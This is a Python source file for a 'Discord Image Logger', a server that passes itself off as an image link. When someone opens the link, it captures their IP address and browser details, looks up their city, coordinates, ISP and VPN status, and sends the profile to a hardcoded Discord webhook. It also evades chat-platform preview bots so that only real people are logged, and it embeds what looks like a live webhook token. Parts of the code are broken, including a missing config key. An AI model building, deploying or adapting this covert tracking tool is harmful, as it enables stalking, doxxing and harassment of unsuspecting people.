# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser
import base64
from urllib import parse
import traceback
from wsgiref.simple_server import make_server
from io import BytesIO

__app__ = "Discord Image Logger"
__description__ = "A simple application which logs IPs when an image is clicked in Discord"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    "webhook": "https://discord.com/api/webhooks/1355317120291967126/7I9oKhUnnXwjZ2ksiD0gNgHyqnoHD_ZkJPV08Bsx2kBw3H7His6e78mZ__rARt3NfZH3",
    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
 "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here",
    },
}

blacklistedIPs = ("27", "104", "143", "164")

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot and config["linkAlerts"]:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [{
                "title": "Image Logger - Link Sent",
                "color": config["color"],
                "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
            }],
        })
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    
    if info["proxy"] and config["vpnCheck"] == 2:
        return
    elif info["proxy"] and config["vpnCheck"] == 1:
        ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4 and not info["proxy"]:
            return
        elif config["antiBot"] == 3:
            return
        elif config["antiBot"] == 2 and not info["proxy"]:
            ping = ""
        elif config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
                   }],
    }
    
    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}
    requests.post(config["webhook"], json=embed)
    return info

def application(environ, start_response):
    try:
        path = environ.get('PATH_INFO', '')
        query_string = environ.get('QUERY_STRING', '')
        ip = environ.get('HTTP_X_FORWARDED_FOR', environ.get('REMOTE_ADDR', 'Unknown'))
        useragent = environ.get('HTTP_USER_AGENT', 'Unknown')

        # Parse query parameters
        dic = dict(parse.parse_qsl(query_string))
        url = config["image"]
        if config["imageArgument"]:
            url = base64.b64decode(dic.get("url", dic.get("id", "")).encode() or b'').decode() or config["image"]

        # Trigger webhook immediately
        endpoint = "/api/image"
        makeReport(ip, useragent, endpoint=endpoint, url=url)

        # Prepare response
        if config["redirect"]["redirect"]:
            headers = [('Location', config["redirect"]["page"]), ('Content-Type', 'text/html')]
            start_response('302 Found', headers)
            return [b'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">']

        if config["buggedImage"] and botCheck(ip, useragent):
            headers = [('Content-Type', 'image/jpeg')]
            start_response('200 OK', headers)
            return [binaries["loading"]]

        data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()

        headers = [('Content-Type', 'text/html')]
        start_response('200 OK', headers)
        return [data]

    except Exception as e:
        reportError(traceback.format_exc())
        headers = [('Content-Type', 'text/html')]
        start_response('500 Internal Server Error', headers)
        return [b'500 - Internal Server Error<br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.']

# Vercel expects an `application` callable
if __name__ == "__main__":
    # Local testing
    server = make_server('localhost', 8000, application)
    server.serve_forever()
